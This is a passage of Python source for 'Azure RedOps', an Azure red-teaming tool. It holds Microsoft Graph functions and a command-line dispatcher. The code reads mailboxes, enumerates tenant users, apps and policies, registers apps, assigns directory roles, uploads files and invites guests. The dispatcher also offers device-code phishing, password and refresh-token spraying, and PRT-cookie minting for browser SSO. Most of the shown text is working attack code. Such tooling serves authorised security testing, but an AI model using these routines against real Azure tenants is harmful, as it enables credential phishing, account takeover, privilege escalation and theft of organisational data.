                        self.print_data(app, 48)

    def graph_self(self, token):
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/v1.0/me", verb="GET", headers=headers)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            self.print_data(response)

    def graph_get_permission(self, token):
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/beta/policies/authorizationPolicy/authorizationPolicy", verb="GET", headers=headers)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            self.print_data(response)

    def graph_read_email(self, token, filter):
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/v1.0/me/messages?$search=\"{filter}\"", verb="GET", headers=headers)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            self.print_data(response)

    def graph_list_all_users(self, token, filename, filter="", console_output=True):
        url = f"https://graph.microsoft.com/v1.0/users{filter}"
        if self.use_beta:
            url = f"https://graph.microsoft.com/beta/users{filter}"

        if console_output:
            self.graph_raw_url(token, url, filename)
        else:
            headers = {}
            self.set_authorization_header(headers, token)
            response = self.http_request(url, verb="GET", headers=headers)
            return response

    def graph_list_applications(self, token, filename, filter="", console_output=True):
        url = f"https://graph.microsoft.com/v1.0/applications{filter}"
        if self.use_beta:
            url = f"https://graph.microsoft.com/beta/applications{filter}"
        if console_output:
            self.graph_raw_url(token, url, filename)
        else:
            headers = {}
            self.set_authorization_header(headers, token)
            response = self.http_request(url, verb="GET", headers=headers)
            return response

    def graph_list_principals(self, token, filename):
        self.graph_raw_url(token, "https://graph.microsoft.com/v1.0/servicePrincipals", filename)

    def graph_register_app(self, token, name, url, permissions):
        resourceAccess = []
        resourceAccess.append({"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"})
        for permission in permissions:
            resourceAccess.append({"id": permission, "type": "Scope"})
            
        data = {"displayName": name, "signInAudience": "AzureADMyOrg", "publicClient": {"redirectUris": [url]}, "requiredResourceAccess": [{"resourceAppId": "00000003-0000-0000-c000-000000000000", "resourceAccess": resourceAccess}], "isFallbackPublicClient": True}
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/v1.0/applications", verb="POST", headers=headers, data=data, send_json=True)

        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            self.print_data(response)

    def graph_add_user_to_group(self, token, uid, gid):
        data = { "@odata.type": "#microsoft.graph.unifiedRoleAssignment", "roleDefinitionId": gid, "principalId": uid, "directoryScopeId": "/" }
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            for item in response:
                self.print_data(item)

    def graph_create_group(self, token, name):
        data = { "displayName": name, "description": name, "mailEnabled": False, "mailNickname": name, "securityEnabled": True }
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/v1.0/groups", verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            for item in response:
                self.print_data(item)

    def graph_push_file(self, token, filepath, name):
        if not os.path.exists(filepath):
            print(f"{self.w("Error")}{filename} not found.")
            exit()

        data = open(filepath, "r").read()
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/v1.0/me/drive/root:/{name}:/content", verb="PUT", headers=headers, data=data)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            for item in response:
                self.print_data(item)

    def graph_gather_all(self, token, filename):
        endpoints = ["https://graph.microsoft.com/beta/policies/authorizationPolicy/authorizationPolicy","organization", "policies/authorizationPolicy", "policies/featureRolloutPolicies", "policies/conditionalAccessPolicies", "users","groups","applications","oauth2PermissionGrants","servicePrincipals","directoryRoles"]
        for endpoint in endpoints:
            current_filename = None
            if filename:
                sanitized_endpoint = endpoint.replace("/", "-").split("//")[-1]
                current_filename = f"{sanitized_endpoint}-{filename}"

            url = "https://graph.microsoft.com/v1.0/"
            if endpoint[:4] == "http":
                url = endpoint
            else:
                url = f"{url}{endpoint}"
            self.graph_raw_url(token, url, current_filename)

    def graph_raw_url(self, token, url, filename = None):
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(url, verb="GET", headers=headers)

        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            next = None
            try:
                next = response["@odata.nextLink"]
            except:
                pass

            if filename:
                  self.save_to_file(filename, response)
            else:
                if "value" in response:
                    for item in response["value"]:
                        self.print_data(item)
                        print()
                else:
                    self.print_data(response)

            if next:
                self.graph_raw_url(token, next, filename)

    def graph_invite_user(self, token, username, url):
        if url == None:
            url = "https://truecyber.world/invite"

        data = { "invitedUserEmailAddress": username, "inviteRedirectUrl": url }
        headers = {}
        self.set_authorization_header(headers, token)
        response = self.http_request(f"https://graph.microsoft.com/beta/invitations", verb="POST", headers=headers, data=data, send_json=True)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            for item in response:
                self.print_data(item)

    def graph_magic_app_finder(self, token):
        grants = []
        allprincipals = []
        apps = []
        headers = {}
        self.set_authorization_header(headers, token)
        url = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
        response = self.http_request(url, verb="GET", headers=headers)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
        else:
            for item in response["value"]:
                grants.append(item)
            while response.get("@odata.nextLink"):
                response = self.http_request(url, verb="GET", headers=headers)
                url = response.get("@odata.nextLink")
                for item in response["value"]:
                    grants.append(item)

            print(f"{self.w("Action")}Got {len(grants)} grants.")

            for grant in grants:
                if grant.get("consentType") == "AllPrincipals":
                    allprincipals.append(grant.get("clientId"))

            allprincipals = list(dict.fromkeys(allprincipals))

            print(f"{self.w("Action")}Got {len(allprincipals)} with consentType set to AllPrincipals.")

            print(f"{self.w("Action")}Searching for application with appRoleAssignmentRequired set to False and type set to User.")
            for all in allprincipals:
                time.sleep(0.2)
                response = self.http_request(f"https://graph.microsoft.com/v1.0/servicePrincipals/{all}", verb="GET", headers=headers)
                if response.get("appRoleAssignmentRequired") == False:
                    appid = response.get("appId")
                    response = self.http_request(f"https://graph.microsoft.com/v1.0/applications(appId='{appid}')", verb="GET", headers=headers)
                    if not "error" in response:
                        api = response.get("api")
                        scope = api.get("oauth2PermissionScopes")
                        if len(scope) > 0:
                            if scope[0].get("type") == "User":
                                client_url = response.get("publicClient")
                                if client_url:
                                    print(f"{self.w("Success")}{response.get("displayName")} ({response.get("appId")}).")
                                    for client in client_url.get("redirectUris"):
                                        print(f"{self.w("Success")}Url Redirection set to {client}.")

def main():
    parser = argparse.ArgumentParser(description=f"Azure RedOps v{VERSION} - A Swiss Army tool for Azure red teaming.")
    parser.add_argument("-a", "--activity", required=True, default="id", help="save, list-token, view, delete, id, phish-start, phish-capture, auth, auth-app, auth-interactive, refresh, obo, browser-sso, self, email, list-users, list-applications, list-principals, register-app, add-group, new-group, push-file, permission, spray, spray-refresh, gather-all, raw-url, invite, magic-app, list-interest, interest, knownids")
    parser.add_argument("-ac", "--access-token", required=False, help="Azure access token")
    parser.add_argument("-n", "--name", required=False, help="Azure access token name")
    parser.add_argument("-t", "--tenant", required=False, help="Azure tenant domain name")
    parser.add_argument("-c", "--devicecode", required=False, help="Device code")
    parser.add_argument("-tid", "--tenant-id", required=False, help="Azure tenant ID")
    parser.add_argument("-app", "--appid", required=False, default="d3590ed6-52b3-4102-aeff-aad2292ab01c", help="Application client ID")
    parser.add_argument("-e", "--endpoint", required=False, default="microsoftonline.com", help="Endpoint to us microsoft.com by default")
    parser.add_argument("-r", "--refresh-token", required=False, help="Authentication refresh token")
    parser.add_argument("-as", "--auto-start", required=False, action="store_true", default=True, help="Autostart phishing capture")
    parser.add_argument("-l", "--load-access-token", required=False, help="Load Azure access token from cache")
    parser.add_argument("-j", "--json", required=False, help="Save output to json a json file")
    parser.add_argument("-fl", "--filter", required=False, help="Filter only certain attributes, comma-separated (e.g., AppID, GivenName)")
    parser.add_argument("-u", "--username", required=False, help="User principal name (email)")
    parser.add_argument("-p", "--password", required=False, help="User password")
    parser.add_argument("-s", "--save", required=False, action="store_true", default=False, help="Save to the credentials file")
    parser.add_argument("-cp", "--check-privileges", required=False, action="store_true", default=False,
    help="Check if the user have privileges upon successful login")
    parser.add_argument("-uid", "--uid", required=False, help="Azure user ID")
    parser.add_argument("-headers", "--headers", required=False, help="Add headers json formatted {'key': 'value', 'key': 'value'}")
    parser.add_argument("-gid", "--gid", required=False, default="62e90394-69f5-4237-91f9-056ad24d70a7", help="Azure group ID")
    parser.add_argument("-i", "--id", required=False, action="store_true", default=False,
    help="Only return application ID")
    parser.add_argument("-ty", "--type", required=False, help="Type of application ID to return")
    parser.add_argument("-fp", "--filepath", required=False, help="Filepath to the file to upload")
    parser.add_argument("-v", "--version", required=False, default="v2.0", help="Authentication version (v0, v2.0)")
    parser.add_argument("-ua", "--user-agent", required=False, help="Set user agent")
    parser.add_argument("-au", "--audience", required=False, help="Set audience (default to https://graph.microsoft.com)")
    parser.add_argument("-sc", "--scope", required=False, help="Set scope (default to: openid offline_access). You may want to use openid only for spraying and https://graph.microsoft.com/.default for Graph")
    parser.add_argument("-url", "--url", required=False, help="Send request to a user specified URL. For interactive login it support multiple URL in a comma separated list: https://url.com,https://url2.com")
    parser.add_argument("-beta", "--beta", required=False, action="store_true", default=False, help="Use the beta API")
    parser.add_argument("-exp", "--expand", required=False, action="store_true", default=False, help="Format output list and dict by expanding them to human readable format")
    parser.add_argument("-pe", "--permissions", required=False, help="Comma separated list of permission GUID")
    parser.add_argument("-k", "--keep", required=False, action="store_true", default=False, help="Keep session.har file")
    parser.add_argument("-cs", "--client-secret", required=False, help="Confidential client secret used by the 'obo' On-Behalf-Of grant")
    parser.add_argument("-prt", "--prt-cookie", required=False, help="PRT cookie value (x-ms-RefreshTokenCredential) to seed browser SSO for 'browser-sso'")
    parser.add_argument("-br", "--browser", required=False, default="firefox", choices=["firefox", "chromium", "webkit"], help="Playwright browser engine for the browser flows (auth-interactive, browser-sso). Default: firefox")
    parser.add_argument("-aprt", "--auto-prt", required=False, action="store_true", default=False, help="For 'browser-sso': auto-mint a PRT cookie from the refresh token (device registration -> PRT -> x-ms-RefreshTokenCredential) so the browser opens already authenticated. Requires the 'cryptography' package and a FOCI/broker refresh token.")
    parser.add_argument("-d", "--debug", required=False, action="store_true", default=False, help="Show debugging information")
    parser.add_argument("-dd", "--verbose-debug", required=False, action="store_true", default=False, help="Show http request debugging  information")
    parser.add_argument("-re", "--redirect-to-file", required=False, action="store_true", default=False, help="Redirect all prints to file")
    args = parser.parse_args()

    app = AzureRedOps()

    app.microsoft_endpoint = args.endpoint
    print(f"{app.w("Action")}Microsoft domain set to '{app.microsoft_endpoint}'.")

    app.browser = args.browser

    if args.redirect_to_file:
        print(f"{app.w("Action")}Output will be redirected to a output.txt.")
        app.redirect_to_file()

    if not args.headers == None:
        print(f"{app.w("Action")}Parsing custom HTTP headers.")
        app.parse_headers(args.headers)

    if args.debug:
        app.debug_mode = True
        print(f"{app.w("Action")}Debug mode is ON.")

    if args.verbose_debug:
        app.verbose_debug_mode = True
        print(f"{app.w("Action")}Verbose debug mode is ON.")

    if args.beta:
        app.use_beta = True
        print(f"{app.w("Action")}Using beta API is ON.")

    if args.expand:
        app.format_print_extended = True

    if not args.filter == None:
        app.filters = args.filter.split(",")

    if not args.user_agent == None:
        app.user_agent = args.user_agent

    if not args.audience == None:
        app.default_audience = args.audience

    app.debug(f"Token audience will be set to '{app.default_audience}'.")

    if not args.scope == None:
        app.default_scope = args.scope

    app.debug(f"Token scope will be set to '{app.default_scope}'.")

    app.debug(f"Using Graph endpoint version '{args.version}'.")

    if args.save:
        if args.name == None:
            print(f"{app.w("Error")}Autosave requires the -n/--name option to be set.")
            exit()
        app.autosave = True
        app.autosave_username = args.name

    if args.check_privileges:
        app.check_privileges = True
        print(f"{app.w("Action")}Permission check is ON.")

    if args.activity == "save":
        token = app.is_args_set(args, "access_token")
        name = app.is_args_set(args, "name")
        tenant = app.is_args_set(args, "tenant_id", False)
        refresh_token = app.is_args_set(args, "refresh_token", False)
        app.save_azure_token_to_file(token, refresh_token, tenant, name)
        print(f"{app.w("Action")}Access token '{name}' saved.")

    elif args.activity == "list-token":
        app.list_saved_token()

    elif args.activity == "view":
        name = app.is_args_set(args, "name")
        app.view_saved_token(name)

    elif args.activity == "delete":
        name = app.is_args_set(args, "name")
        app.delete_saved_token(name)

    elif args.activity == "id":
        tenant = app.is_args_set(args, "tenant")
        app.get_azure_tenant_id(tenant)

    elif args.activity == "phish-start":
        app.print_hint(["Set the scope to 'https://graph.microsoft.com/.default offline_access openid'"])
        autostart = args.auto_start
        appid = app.is_args_set(args, "appid", False)
        tenant_id = app.is_args_set(args, "tenant_id", False)
        app.device_code_start(autostart, appid, tenant_id)

    elif args.activity == "phish-capture":
        app.print_hint(["For Browser SSO use the Microsoft Authentication Broker application (29d9ed98-a469-4536-ade2-f981bc1d605e)"])
        code = app.is_args_set(args, "devicecode")
        appid = app.is_args_set(args, "appid", False)
        tenant_id = app.is_args_set(args, "tenant_id", False)
        app.device_code_capture(code, appid, tenant_id)

    elif args.activity == "auth":
        version = app.is_args_set(args, "version")
        username = app.is_args_set(args, "username")
        password = app.is_args_set(args, "password")
        tenant = app.is_args_set(args, "tenant_id")
        appid = app.is_args_set(args, "appid")
        app.auth(username, password, tenant, appid, version)

    elif args.activity == "auth-app":
        tenant = app.is_args_set(args, "tenant_id")
        client = app.is_args_set(args, "appid", False)
        if client == None:
            client = "8545b2fc-a69c-4851-9206-0f74a519fe5f"
        app.auth_app(tenant, client)

    elif args.activity == "auth-interactive":
        app.autosave = True
        keep = app.is_args_set(args, "keep", False)
        url = app.is_args_set(args, "url", False)
        if url == None:
            url = "https://portal.azure.com"
        app.auth_interactive(url, keep)

    elif args.activity == "refresh":
        app.print_hint(["If your refresh token came from a web flow (e.g., with PKCE or a browser session), it is tied to that user session and cannot be replayed by scripts or a different flow."])
        version = app.is_args_set(args, "version")
        name = app.is_args_set(args, "load_access_token", False)
        refresh_token = None
        if not name == None:
            refresh_token = app.get_azure_token_from_file(name, "refresh_token")
            tenant = app.get_azure_token_from_file(name, "tenant")
        else:
            refresh_token = app.is_args_set(args, "refresh_token")
            tenant = app.is_args_set(args, "tenant_id")

        appid = app.is_args_set(args, "appid")
        app.refresh(refresh_token, tenant, appid, version=version)

    elif args.activity == "obo":
        app.print_hint(["OBO requires a confidential client whose 'aud' matches the assertion token. Set the target resource with -au/--audience (default https://graph.microsoft.com) or a full scope with -sc/--scope, and the secret with -cs/--client-secret."])
        assertion = app.is_args_set(args, "load_access_token", False)
        if not assertion == None:
            assertion = app.get_azure_token_from_file(assertion, "access_token")
        else:
            assertion = app.is_args_set(args, "access_token")
        tenant = app.is_args_set(args, "tenant_id")
        appid = app.is_args_set(args, "appid")
        secret = app.is_args_set(args, "client_secret", False)
        scope = app.default_scope if args.scope else None
        app.obo(assertion, tenant, appid, secret, scope)

    elif args.activity == "browser-sso":
        app.print_hint(["Pick a target with -url: outlook, office, teams, sharepoint, onedrive, portal, graph, or a raw https URL (comma-separated for several). Defaults to outlook.",
                        "For a hands-free authenticated browser, add -aprt/--auto-prt to auto-mint a PRT cookie from the refresh token (needs the 'cryptography' package and a FOCI/broker refresh token, e.g. from device-code phishing the Microsoft Authentication Broker).",
                        "Or seed a PRT cookie you already have with -prt/--prt-cookie (the x-ms-RefreshTokenCredential value)."])
        version = app.is_args_set(args, "version")
        name = app.is_args_set(args, "load_access_token", False)
        if not name == None:
            refresh_token = app.get_azure_token_from_file(name, "refresh_token")
            tenant = app.get_azure_token_from_file(name, "tenant")
        else:
            refresh_token = app.is_args_set(args, "refresh_token")
            tenant = app.is_args_set(args, "tenant_id")
        appid = app.is_args_set(args, "appid")
        target = app.is_args_set(args, "url", False)
        prt = app.is_args_set(args, "prt_cookie", False)
        keep = args.keep
        auto_prt = args.auto_prt
        app.browser_sso(refresh_token, tenant, appid, target, prt, version, keep, auto_prt)

    elif args.activity == "self":
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_self(token)

    elif args.activity == "permission":
        app.print_hint(["Extend the to token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_get_permission(token)

    elif args.activity == "email":
        filter = app.is_args_set(args, "filter")
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_read_email(token, filter)

    elif args.activity == "list-users":
        filename = app.is_args_set(args, "json", False)
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_list_all_users(token, filename)

    elif args.activity == "list-applications":
        filename = app.is_args_set(args, "json", False)
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_list_applications(token, filename)

    elif args.activity == "list-principals":
        filename = app.is_args_set(args, "json", False)
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_list_principals(token, filename)

    elif args.activity == "register-app":
        name = app.is_args_set(args, "name")
        url = app.is_args_set(args, "url")
        token = app.is_args_set(args, "load_access_token", False)
        permissions = app.is_args_set(args, "permissions", False).split(",")
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_register_app(token, name, url, permissions)

    elif args.activity == "add-group":
        uid = app.is_args_set(args, "uid")
        gid = app.is_args_set(args, "gid")
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_add_user_to_group(token, uid, gid)

    elif args.activity == "new-group":
        name = app.is_args_set(args, "name")
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_create_group(token, name)

    elif args.activity == "push-file":
        filepath = app.is_args_set(args, "filepath")
        name = app.is_args_set(args, "name")
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_push_file(token, filepath, name)

    elif args.activity == "spray":
        username = app.is_args_set(args, "username")
        password = app.is_args_set(args, "password")
        tenant = app.is_args_set(args, "tenant_id")
        filepath = app.is_args_set(args, "filepath", False)
        app.graph_spray(username, password, tenant, filepath)

    elif args.activity == "spray-refresh":
        version = app.is_args_set(args, "version")
        name = app.is_args_set(args, "load_access_token", False)
        filepath = app.is_args_set(args, "filepath", False)
        refresh_token = None
        if not name == None:
            refresh_token = app.get_azure_token_from_file(name, "refresh_token")
            tenant = app.get_azure_token_from_file(name, "tenant")
        else:
            refresh_token = app.is_args_set(args, "refresh_token")
            tenant = app.is_args_set(args, "tenant_id")
        app.graph_spray_refresh(refresh_token, tenant, version, filepath)

    elif args.activity == "gather-all":
        app.print_hint(["Extend the to token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
        filename = app.is_args_set(args, "json", False)
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_gather_all(token, filename)

    elif args.activity == "raw-url":
        app.print_hint(["Querying user beta endpoint return on-prem information https://graph.microsoft.com/beta/users"])
        filename = app.is_args_set(args, "json", False)
        url = app.is_args_set(args, "url")
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_raw_url(token, url, filename)

    elif args.activity == "invite":
        url = app.is_args_set(args, "url", False)
        username = app.is_args_set(args, "name")
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_invite_user(token, username, url)

    elif args.activity == "magic-app":
        app.print_hint(["Extend the to token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
        token = app.is_args_set(args, "load_access_token", False)
        if not token == None:
            token = app.get_azure_token_from_file(token, "access_token")
        else:
            token = app.is_args_set(args, "access_token")

        app.graph_magic_app_finder(token)

    elif args.activity == "list-interest":
        app.get_list_of_interest()

    elif args.activity == "interest":
        app.get_ids_of_interest(args.id, args.type)

    elif args.activity == "knownids":
        app.get_known_ids()

    else:
        print(f"{app.w("Error")}Invalid activity provided.")

if __name__ == "__main__":
    main()